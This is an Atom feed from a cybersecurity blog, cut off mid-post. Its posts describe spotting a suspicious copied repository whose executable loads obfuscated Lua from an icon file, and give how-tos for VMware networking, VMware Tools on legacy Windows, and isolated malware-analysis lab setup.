<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ISSAC/iss4cf0ng&#39;s blog</title>
  
  <subtitle>CyberSecurity blog</subtitle>
  <link href="https://iss4cf0ng.github.io/atom.xml" rel="self"/>
  
  <link href="https://iss4cf0ng.github.io/"/>
  <updated>2026-02-25T07:34:06.991Z</updated>
  <id>https://iss4cf0ng.github.io/</id>
  
  <author>
    <name>ISSAC</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Reverse Engineering] How I Found a Suspicious Redistribution of My Project</title>
    <link href="https://iss4cf0ng.github.io/2026/02/24/2026-2-24-UnofficialRedistribution/"/>
    <id>https://iss4cf0ng.github.io/2026/02/24/2026-2-24-UnofficialRedistribution/</id>
    <published>2026-02-24T08:30:40.000Z</published>
    <updated>2026-02-25T07:34:06.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>By coincidence, I discovered a repository using the same name as my <a href="https://iss4cf0ng.github.io/2026/02/06/2026-2-6-ToolDotNetPELoader/">dotNetPELoader</a> project, which caught my attention. I found that the source code in this repository is identical to mine, but it also includes an AI-generated README file.</p><p>Given my recent experience studying malware analysis, I decided to perform reverse engineering on this suspicious executable.</p><h1 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h1><p>First, the excessive use of emojis suggests this repository may have been AI-generated.</p><p align="center" class='item-img' data-src='/images/article/2026-2-24-UnofficialRedistribution/1.png'><img src="/images/article/2026-2-24-UnofficialRedistribution/1.png" width=800></p><p>Second, the README claims that the tool requires administrative rights to run, which is incorrect. I have demonstrated that dotNetPELoader works under user mode.</p><h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><p>The repository provides a direct ZIP download, bypassing the official <strong>Releases</strong> feature on GitHub.</p><p align="center" class='item-img' data-src='/images/article/2026-2-24-UnofficialRedistribution/2.png'><img src="/images/article/2026-2-24-UnofficialRedistribution/2.png" width=700></p><p>When performing reverse engineering, make sure to work in a virtual environment. (If you want to learn how to set up a safe experimental virtual environment for malware analysis, please <a href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-HowToSetupYourExpEnv/">click here</a> and <a href="https://iss4cf0ng.github.io/2026/02/22/2026-2-22-ConfigureVirtualNetwork/">here</a>).</p><p>Open the executable <code>jit.exe</code> with <code>ExeInfo</code>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-24-UnofficialRedistribution/3.png'><img src="/images/article/2026-2-24-UnofficialRedistribution/3.png" width=700></p><p>The content of <code>App.cmd</code>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-24-UnofficialRedistribution/4.png'><img src="/images/article/2026-2-24-UnofficialRedistribution/4.png" width=500></p><p>The content of <code>bcjit.ico</code>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-24-UnofficialRedistribution/5.png'><img src="/images/article/2026-2-24-UnofficialRedistribution/5.png" width=700></p><p>The Lua code is obfuscated. From my analysis, it appears that <code>jit.exe</code> loads the obfuscated code from <code>bcjit.ico</code> into memory and executes it. Do <strong>NOT</strong> run these files outside a controlled virtual environment.</p><p>Next, I opened the <code>jit.exe</code> with Ghidra. The decompiled output confirms my hypothesis:</p><p align="center" class='item-img' data-src='/images/article/2026-2-24-UnofficialRedistribution/6.png'><img src="/images/article/2026-2-24-UnofficialRedistribution/6.png" width=300>    <figcaption>    It imports LUA51.DLL    </figcaption></p><p align="center" class='item-img' data-src='/images/article/2026-2-24-UnofficialRedistribution/7.png'><img src="/images/article/2026-2-24-UnofficialRedistribution/7.png" width=700>    <figcaption>    lua_cpcall()    </figcaption></p><p align="center" class='item-img' data-src='/images/article/2026-2-24-UnofficialRedistribution/8.png'><img src="/images/article/2026-2-24-UnofficialRedistribution/8.png" width=700>    <figcaption>    `lua_loadfile()`    </figcaption></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This is the first time I encounter this issue. Fortunately, I have been learning malware analysis recently. Regardless of the Lua script’s functionality—it might be as harmless as a “Hello world!”—it is still highly suspicious.</p><p>Again, this suspicious executable file with Lua loader is <strong>NOT</strong> my work.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/hakari_crying.jpeg'><img src="/images/meme/hakari_crying.jpeg" width=600></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h1&gt;&lt;p&gt;By coincidence, I discovered a reposit</summary>
      
    
    
    
    <category term="Malware Analysis" scheme="https://iss4cf0ng.github.io/categories/Malware-Analysis/"/>
    
    
    <category term="Reverse Engineering" scheme="https://iss4cf0ng.github.io/tags/Reverse-Engineering/"/>
    
    <category term="Malware" scheme="https://iss4cf0ng.github.io/tags/Malware/"/>
    
    <category term="Malware Analysis" scheme="https://iss4cf0ng.github.io/tags/Malware-Analysis/"/>
    
    <category term="Ghidra" scheme="https://iss4cf0ng.github.io/tags/Ghidra/"/>
    
    <category term="Lua" scheme="https://iss4cf0ng.github.io/tags/Lua/"/>
    
    <category term="Unofficial Redistribution" scheme="https://iss4cf0ng.github.io/tags/Unofficial-Redistribution/"/>
    
    <category term="Lua Loader" scheme="https://iss4cf0ng.github.io/tags/Lua-Loader/"/>
    
  </entry>
  
  <entry>
    <title>[Learning] How to Configure the Network of Your Virtual Machine using VMware Workstation</title>
    <link href="https://iss4cf0ng.github.io/2026/02/22/2026-2-22-ConfigureVirtualNetwork/"/>
    <id>https://iss4cf0ng.github.io/2026/02/22/2026-2-22-ConfigureVirtualNetwork/</id>
    <published>2026-02-22T04:15:57.000Z</published>
    <updated>2026-02-24T14:20:13.742Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In the <a href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-HowToSetupYourExpEnv/">previos article</a>, I described how to setup a virtual environment for malware analysis. However, I did not fully explain the virtual network configuration. Therefore, I decided to write this article to help anyone facing the same issue. It also serves as a personal note on setting up an analysis environment efficiently.</p><p>This article explains how virtual networks operate between virtual machines and introduces the configuration of different network adapters.</p><h1 id="Caution"><a href="#Caution" class="headerlink" title="Caution"></a>Caution</h1><p>Sometimes the network may still be misconfigured after you have tried all possible options. Based on my experience, reinstalling the virtual machine (possibly using a different, newest ISO image) can sometimes be a more effective solution.</p><p align="center" class='item-img' data-src='/images/meme/koyuki_crying.gif'><img src="/images/meme/koyuki_crying.gif" width=300></p><h1 id="Network-Configuration"><a href="#Network-Configuration" class="headerlink" title="Network Configuration"></a>Network Configuration</h1><h2 id="Fundamental-Network-Knowledge"><a href="#Fundamental-Network-Knowledge" class="headerlink" title="Fundamental Network Knowledge"></a>Fundamental Network Knowledge</h2><p>Before configuring the network of your virtual machines. You should understand the following terms:</p><ul><li>DHCP: A network management protocol that automatically assigns IP addresses, subnet masks, default gateways, and DNS server details to devices on a network.</li><li>Subnet mask: A 32-bit value (for IPv4 addresses) used to divide an IP address into network and host portions, defining which devices belong to the same local network.</li><li>Default gateway: A nework node—typically a router—that acts as an access point or “exit door” for traffic leaving a local network to reach other networks or the internet.</li></ul><p align="center" class='item-img' data-src='/images/meme/mari_praying.png'><img src="/images/meme/mari_praying.png" width=300></p><h2 id="Network-Adapter"><a href="#Network-Adapter" class="headerlink" title="Network Adapter"></a>Network Adapter</h2><p>VMware Workstation 17 provides five different network adapter modes:</p><ul><li>Bridged: This mode allows a virtual machine to connect directly to the physical network. The virtual machine can communicate with other devices on the same local network. It can also access the internet if the host machine is connected to router or Wi-Fi access point.</li><li>NAT: This mode allows virtual machines to share the host computer’s IP address to access external networks, such as the internet. Virtual machines can access the internet through the host’s connection.</li><li>Host-only: This mode creates a private, isolated network within the host computer. Virtual machines can communicate only with the host and other VMs on the same host-only network. They cannot access the external internet.</li><li>Custom: This mode enables advanced networking configurations by allowing VMs to connect to specific virtual networks configured in the Virtual Network Editor. It is ideal for complex multi-VM lab environments where traffic isolation is required.</li><li>LAN segment: It creates a completely isolated virtual network that connects multiple virtual machines together without allowing communication with the host or the external network.</li></ul><p align="center" class='item-img' data-src='/images/meme/mika_rollcake.png'><img src="/images/meme/mika_rollcake.png" width=300></p><h2 id="Which-Network-Adapter-should-you-use"><a href="#Which-Network-Adapter-should-you-use" class="headerlink" title="Which Network Adapter should you use?"></a>Which Network Adapter should you use?</h2><p>In depends on your purpose:</p><ul><li>If you want your virtual machines to access other physical devices on the local network (LAN), use <strong>Bridged</strong> mode.</li><li>If you only need internet access, use <strong>NAT</strong> mode.</li><li>If you are conducting malware analysis and require strict network isolation, use <strong>LAN segment</strong> mode.</li></ul><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><p>Before configuring your network adapter, make sure your virtual machines are properly installed.</p><h2 id="Configure-Your-Network-Adapter"><a href="#Configure-Your-Network-Adapter" class="headerlink" title="Configure Your Network Adapter"></a>Configure Your Network Adapter</h2><p>Navigate to your virtual machine, right-click it, and select <strong>Settings</strong>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/2.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/2.png" width=600></p><p>Now you can choose the desired network adapter mode:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/3.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/3.png" width=600></p><p>You can also add an additional network adapter for multi-network adapter:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/4.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/4.png" width=600></p><p>Remember to enable “Connected” and “Connect at power on”:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/5.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/5.png" width=500></p><p>Configuring the adapter as <strong>Bridged</strong>, <strong>NAT</strong>, or <strong>Host-only</strong> is straightforward. Next, I will explain how to configure <strong>Custom</strong> and <strong>LAN segment modes</strong>.</p><h2 id="Custom"><a href="#Custom" class="headerlink" title="Custom"></a>Custom</h2><p>The difference between <strong>Custom</strong> and the first three network connection is that <strong>Custom</strong> provides more advanced configuration options.</p><p>To configure it, navigate to the VMware Workstation menu and select:</p><p>Edit -&gt; Virtual Network Editor</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/6.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/6.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/7.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/7.png" width=500></p><p>From there, you can customize the configuration as needed. For example, you can specify which physical network adapter the bridged network shoud use.</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/8.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/8.png" width=500></p><p>You can also manually define the subnet IP and subnet mask for your virtual network.</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/9.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/9.png" width=500></p><h2 id="LAN-segment"><a href="#LAN-segment" class="headerlink" title="LAN segment"></a>LAN segment</h2><p>Configuring a LAN segment is slightly more complex.</p><p>First, create a new LAN segment using the Global LAN Segments wizard, then start your virtual machines.</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/1.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/1.png" width=600></p><p>Since this mode does not provide a DHCP service, you must manually assign IP addresses to your machines.</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>If your virtual machine runs Windows, execute the following command to opent the Network Connections panel:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; ncpa.cpl<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/10.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/10.png" width=600></p><p>Right-click the network adapter and select “Properties”:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/11.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/11.png" width=600></p><p>Select “Internet Protocol Version 4 (TCP/IPv4)” and click the “Properties”:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/12.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/12.png" width=600></p><p>Manually configure the IPv4 address for your virtual machines:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/13.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/13.png" width=600 alt="Windows 10"></p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/14.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/14.png" width=600 alt="Windows XP"></p><p>To test connectivity, run:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; ping 192.168.85.2<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/15.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/15.png" width=600 alt="Windows 10"></p><p>If the destination host is unreachable, the firewall may be blocking ICMP requests:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/16.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/16.png" width=600 alt="Windows XP"></p><p>In this case, disable the Windows firewall temporarily for testing:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/17.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/17.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/18.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/18.png" width=600></p><p>If the virtual machines still cannot communicate with each other, verify that their subnet masks match. Machines will not be able to reach each other if the subnet mask values are different. (In this case, both use <code>255.255.255.0</code>)</p><h3 id="Linux-Debian-Kali-Linux"><a href="#Linux-Debian-Kali-Linux" class="headerlink" title="Linux (Debian / Kali Linux)"></a>Linux (Debian / Kali Linux)</h3><p>Manually assigning an IP address on Linux is different from Windows.</p><p>First, identify your network interface name:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ ip a<br></code></pre></td></tr></table></figure><br>It should be something like <strong>ens33</strong>, <strong>ens160</strong> or <strong>eth0</strong>:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/20.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/20.png" width=600></p><p>Edit <code>interfaces</code> file:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ sudo nano /etc/network/interfaces<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/21.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/21.png" width=600></p><p>Replace or add:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">auto eth0<br>iface eth0 inet static<br>    address 192.168.100.30<br>    netmask 255.255.255.0<br></code></pre></td></tr></table></figure></p><blockquote><p>Important: Replace <code>eth0</code> with your actual interface</p></blockquote><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/22.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/22.png" width=600></p><p>Restart networking:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo systemctl restart networking<br></code></pre></td></tr></table></figure></p><p>Verify:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/23.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/23.png" width=700></p><p>Test connectivity:</p><p align="center" class='item-img' data-src='/images/article/2026-2-22-ConfigureVirtualNetwork/24.png'><img src="/images/article/2026-2-22-ConfigureVirtualNetwork/24.png" width=700></p><h3 id="Linux-Ubuntu"><a href="#Linux-Ubuntu" class="headerlink" title="Linux (Ubuntu)"></a>Linux (Ubuntu)</h3><p>Configuring Ubuntu is almost the same, but with the different configuration file:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo nano /etc/netplan/01-network-manager-all.yaml<br></code></pre></td></tr></table></figure></p><p>Replace contents with:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">network:<br>  version: 2<br>  renderer: NetworkManager<br>  ethernets:<br>    eth0:<br>      dhcp4: no<br>      addresses:<br>        - 192.168.85.5/24<br></code></pre></td></tr></table></figure></p><blockquote><p>Important: Replace <code>ens33</code> with your interface</p></blockquote><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_rollcake_hit.png'><img src="/images/meme/mika_rollcake_hit.png" width=500></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;In the &lt;a href=&quot;https://iss4cf</summary>
      
    
    
    
    <category term="Learning" scheme="https://iss4cf0ng.github.io/categories/Learning/"/>
    
    
    <category term="Network" scheme="https://iss4cf0ng.github.io/tags/Network/"/>
    
    <category term="Learning" scheme="https://iss4cf0ng.github.io/tags/Learning/"/>
    
    <category term="Linux" scheme="https://iss4cf0ng.github.io/tags/Linux/"/>
    
    <category term="Windows" scheme="https://iss4cf0ng.github.io/tags/Windows/"/>
    
    <category term="Setup" scheme="https://iss4cf0ng.github.io/tags/Setup/"/>
    
    <category term="VMware" scheme="https://iss4cf0ng.github.io/tags/VMware/"/>
    
    <category term="VMware WorkStation" scheme="https://iss4cf0ng.github.io/tags/VMware-WorkStation/"/>
    
    <category term="Configuration" scheme="https://iss4cf0ng.github.io/tags/Configuration/"/>
    
    <category term="Network Configuration" scheme="https://iss4cf0ng.github.io/tags/Network-Configuration/"/>
    
    <category term="Virtual Network" scheme="https://iss4cf0ng.github.io/tags/Virtual-Network/"/>
    
    <category term="Virtual Network Configuration" scheme="https://iss4cf0ng.github.io/tags/Virtual-Network-Configuration/"/>
    
    <category term="Kali" scheme="https://iss4cf0ng.github.io/tags/Kali/"/>
    
    <category term="Kali Linux" scheme="https://iss4cf0ng.github.io/tags/Kali-Linux/"/>
    
  </entry>
  
  <entry>
    <title>[Troubleshooting] Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17</title>
    <link href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-WinXpVMWareTool/"/>
    <id>https://iss4cf0ng.github.io/2026/02/21/2026-2-21-WinXpVMWareTool/</id>
    <published>2026-02-21T03:32:09.000Z</published>
    <updated>2026-02-22T03:43:42.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article explains how to install VMware Tools on Windows XP and Windows 95 using WMware Workstation 17. </p><p>The installation enables features such as drag-and-drop and copy-and-paste between the host and the virtual machine.</p><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Recently, while learning malware analysis, I installed multiple legacy operating systems in VMware Workstation. I then realized that VMware Tools included in Workstation 17 does not support legacy operating systems such as Windows XP by default.</p><p>After successfully completing the installation, I found that the official instructions were not very user-friendly. Therefore, I decided to write this article to help anyone facing the same issue.</p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Windows-XP"><a href="#Windows-XP" class="headerlink" title="Windows XP"></a>Windows XP</h2><p>Power on your virtual machine. From the toolbar in VMware Workstation, navigate to:</p><p>VM -&gt; Install VMware Tools</p><p>You should see the following error message:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/1.png'><img src="/images/article/2026-2-21-VMWareTool/1.png" width=500></p><p>The first URL (an ISO file) provides VMware Tools for legacy Windows operating systems, while the second URL contains instructions—which may not be very user-friendly.</p><p>Click the first URL to download the ISO file, and move it to an appropriate directory.</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/2.png'><img src="/images/article/2026-2-21-VMWareTool/2.png" width=900></p><p>Note that no need to power off your virtual machine. Open the virtual machine settings:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/3.png'><img src="/images/article/2026-2-21-VMWareTool/3.png" width=400></p><p>Select “CD/DVD” and modify the ISO image file path to the ISO file you downloaded eariler:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/4.png'><img src="/images/article/2026-2-21-VMWareTool/4.png" width=700></p><p>Start your virtual machine and open “My Computer”:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/5.png'><img src="/images/article/2026-2-21-VMWareTool/5.png" width=400></p><p>If the ISO file is mounted successfully, you shoud see VMware Tools listed as a removable drive:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/6.png'><img src="/images/article/2026-2-21-VMWareTool/6.png" width=700></p><p>Double-click “VMWare Tools” to launch the installer:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/7.png'><img src="/images/article/2026-2-21-VMWareTool/7.png" width=400></p><p>Follow the installation wizard to complete the setup:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/8.png'><img src="/images/article/2026-2-21-VMWareTool/8.png" width=400></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/9.png'><img src="/images/article/2026-2-21-VMWareTool/9.png" width=400></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/10.png'><img src="/images/article/2026-2-21-VMWareTool/10.png" width=400></p><p>After installation, restart your virtual machine:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/11.png'><img src="/images/article/2026-2-21-VMWareTool/11.png" width=400></p><p>If the VMWare Tools has been installed successfully, you will be able to use features such as drag-and-drop and copy-and-paste between the host and the guest system.</p><h2 id="Windows-95"><a href="#Windows-95" class="headerlink" title="Windows 95"></a>Windows 95</h2><p>Installing VMWare Tools on Windows 95 is almost following the same procedure, but the ISO file is different. </p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/12.png'><img src="/images/article/2026-2-21-VMWareTool/12.png" width=400></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/13.png'><img src="/images/article/2026-2-21-VMWareTool/13.png" width=800></p><p>Select “CD/DVD” and modify the ISO image file path to the ISO file you downloaded eariler:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/14.png'><img src="/images/article/2026-2-21-VMWareTool/14.png" width=700></p><p>Start your virtual machine and open “My Computer”, If the ISO file is mounted successfully, you shoud see VMware Tools listed as a removable drive:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/15.png'><img src="/images/article/2026-2-21-VMWareTool/15.png" width=600></p><p>Follow the installation wizard to complete the setup:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/16.png'><img src="/images/article/2026-2-21-VMWareTool/16.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/17.png'><img src="/images/article/2026-2-21-VMWareTool/17.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/18.png'><img src="/images/article/2026-2-21-VMWareTool/18.png" width=600></p><p>After installation, restart your virtual machine.  </p><p>If the VMWare Tools has been installed successfully, you will be able to use features such as drag-and-drop and copy-and-paste between the host and the guest system:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-VMWareTool/19.png'><img src="/images/article/2026-2-21-VMWareTool/19.png" width=600></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width=500></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article explains how to i</summary>
      
    
    
    
    <category term="Troubleshooting" scheme="https://iss4cf0ng.github.io/categories/Troubleshooting/"/>
    
    
    <category term="VMware" scheme="https://iss4cf0ng.github.io/tags/VMware/"/>
    
    <category term="Troubleshooting" scheme="https://iss4cf0ng.github.io/tags/Troubleshooting/"/>
    
    <category term="VMware Tools" scheme="https://iss4cf0ng.github.io/tags/VMware-Tools/"/>
    
    <category term="Windows XP" scheme="https://iss4cf0ng.github.io/tags/Windows-XP/"/>
    
    <category term="Windows 95" scheme="https://iss4cf0ng.github.io/tags/Windows-95/"/>
    
  </entry>
  
  <entry>
    <title>[Learning] How to Setup Your Experimental Environment for Malware Analysis</title>
    <link href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-HowToSetupYourExpEnv/"/>
    <id>https://iss4cf0ng.github.io/2026/02/21/2026-2-21-HowToSetupYourExpEnv/</id>
    <published>2026-02-21T03:24:39.000Z</published>
    <updated>2026-02-23T02:51:07.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Recently, I realized how important it is to set up an experimental environment quickly. A properly configured environment significantly reduces the time spent installing tools and preparing virtual machines for malware execution and analysis.</p><p>Therefore, I decided to write this article to help anyone facing the same issue. It also serves as a personal note on setting up an analysis environment efficiently.</p><p>This article explains how to set up your experimental environment for malware analysis.</p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Virtual-Machine"><a href="#Virtual-Machine" class="headerlink" title="Virtual Machine"></a>Virtual Machine</h2><p>To analyze malware, you need at least one virtual machine.</p><p>For modern malware, Windows 10 x64 is a suitable choice, as it can execute both x64 and x86 PE files. It can also run executables built with .NET Framework 4.8. However, if you want to study legacy malware such as <a href="https://iss4cf0ng.github.io/2026/02/18/2026-2-18-Netbus/">Netbus</a>, you may need to install Windows XP or even Windows 95(<a href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-WinXpVMWareTool/">click here</a> to learn how to install VMware Tools for Windows XP and Windows 95).</p><p>If you plan to explore topics overlapping with reverse engineering—such as buffer overflows or firmware analysis——you may need additional environments.</p><p>For example:</p><ul><li>Windows XP (to study exploits without modern protections such as ASLR and DEP)</li><li>Kali Linux (for generating shellcode or conducting exploit development)</li><li>Debian or Ubuntu (for firmware extraction and analysis)</li></ul><p>If you are interested in studying buffer overflows, you can <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteWindowsBufferOverflow/">click here</a> to read my notes.</p><h2 id="Snapshot"><a href="#Snapshot" class="headerlink" title="Snapshot"></a>Snapshot</h2><p>A VMware snapshot is a point-in-time image of a virtual machine that captures its exact state—including memory, disk data, and settings—at a specific moment. It acts as a quick “undo” button for testing. It allows users to revert to a previous, stable state, through they are not intended as long-term backups.</p><p>Snapshots should be treated as temporary restore points rather than backup mechanisms.</p><h2 id="Isolation-and-Safety-Considerations"><a href="#Isolation-and-Safety-Considerations" class="headerlink" title="Isolation and Safety Considerations"></a>Isolation and Safety Considerations</h2><p>When building a malware analysis environment, always ensure that the virtual machines are isolated from your host system and external networks.<br>Snapshots should be used before executing any unknown sample.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><h3 id="Shared-Folder-If-necessary"><a href="#Shared-Folder-If-necessary" class="headerlink" title="Shared Folder (If necessary)"></a>Shared Folder (If necessary)</h3><p>Navigate to “Shared Folders”, select “Read-only”:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/1.png'><img src="/images/article/2026-2-21-ExpEnv/1.png" width=800></p><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p>Tools are important for handling a complicated malware. You should transfer all your tools for malware analysis into the virtual machine before taking a snapshot:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/2.png'><img src="/images/article/2026-2-21-ExpEnv/2.png" width=500></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/3.png'><img src="/images/article/2026-2-21-ExpEnv/3.png" width=800></p><h3 id="Snapshot-1"><a href="#Snapshot-1" class="headerlink" title="Snapshot"></a>Snapshot</h3><p>A VMware 